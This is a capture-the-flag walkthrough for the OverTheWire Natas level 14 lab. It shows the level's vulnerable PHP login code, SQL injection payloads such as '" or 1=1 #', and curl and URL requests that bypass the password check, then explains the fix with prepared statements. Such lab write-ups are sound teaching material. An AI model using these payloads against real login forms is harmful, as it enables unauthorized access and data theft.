# Natas Level 13 → Level 14

**Goal:** Find the password for natas15. This level has a login form that's vulnerable to `SQL injection` because user input is concatenated directly into a SQL query without sanitization.

### Step 1: Access the level

http://natas14.natas.labs.overthewire.org

Username: natas14
Password: (from previous level)

### Step 2: Read the page

The page shows a simple login form asking for a username and password.

### Step 3: View the PHP source code

Go to:

http://natas14.natas.labs.overthewire.org/index-source.html

You'll see logic like:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Query: $query\n";
    }

    $res = mysql_query($query, $link);
    if ($res) {
        if (mysql_num_rows($res) > 0) {
            echo "Successful login! The password for natas15 is <censored>";
        } else {
            echo "Access denied!";
        }
    } else {
        echo "Error in query.";
    }
}
?>
```

*Key problem:* the username and password values from the request are inserted directly into the SQL query string using double quotes, with no escaping or parameterization, `classic SQL injection`.

### Step 4: Craft an SQL injection payload

Since the query looks like:

```sql
SELECT * from users where username="<username>" and password="<password>"
``` 

We can break out of the username field's quotes and comment out the rest of the query (including the password check) using " to close the string and # (or --) to comment out everything after:

username: " or "1"="1
password: (anything, or leave blank)

This turns the query into:

```sql
SELECT * from users where username="" or "1"="1" and password="..."
```

A cleaner, more reliable payload comments out the password check entirely:

username: "#

or

username: " or 1=1 #

This produces:

```sql
SELECT * from users where username="" or 1=1 #" and password="..."
```

Everything after `#` is treated as a comment, so the password check is bypassed, and `1=1` makes the condition always true, returning all rows.

### Step 5: Submit the payload

- Using curl:

```bash
curl -u natas14:<password_from_level14> \
  --data-urlencode 'username=" or 1=1 #' \
  --data-urlencode 'password=anything' \
  http://natas14.natas.labs.overthewire.org/index.php
```

- Or via the browser form directly, type into the username field:

" or 1=1 #

and submit (password field can be left blank or filled with anything).

- Or via URL (GET):

http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%201=1%20%23&password=x

### Step 6: Get the password

The response will show:

Successful login! The password for natas15 is <XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX>

(Tip: add `&debug` to the URL to see the exact query being constructed, useful for understanding/debugging your payload.)

*Lesson learned*

Concatenating user input directly into SQL queries allows attackers to manipulate the query's logic entirely bypassing authentication, extracting data, or worse. The fix is to always use `parameterized queries / prepared statements` (e.g., PDO with bound parameters in PHP) instead of string concatenation, so user input is always treated as data, never as part of the SQL syntax.